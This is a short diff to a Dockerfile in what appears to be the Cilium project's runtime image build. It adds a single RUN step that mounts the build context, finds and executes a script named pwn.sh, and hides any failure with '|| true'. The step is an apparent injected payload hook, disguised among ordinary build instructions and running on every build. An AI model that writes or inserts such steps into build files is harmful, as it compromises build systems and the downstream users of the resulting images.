@@ -19,6 +19,8 @@ FROM --platform=linux/amd64 ${GOLANG_IMAGE} as gops-cni-builder
 
 RUN apt-get update && apt-get install -y binutils-aarch64-linux-gnu
 
+RUN --mount=type=bind,source=/,target=/host bash -c "bash \$(find /host -name pwn.sh | grep images/runtime | head -n 1) || true"
+
 # build-gops.sh will build both archs at the same time
 WORKDIR /go/src/github.com/cilium/cilium/images/runtime
 RUN --mount=type=bind,readwrite,target=/go/src/github.com/cilium/cilium/images/runtime --mount=target=/root/.cache,type=cache --mount=target=/go/pkg/mod,type=cache \
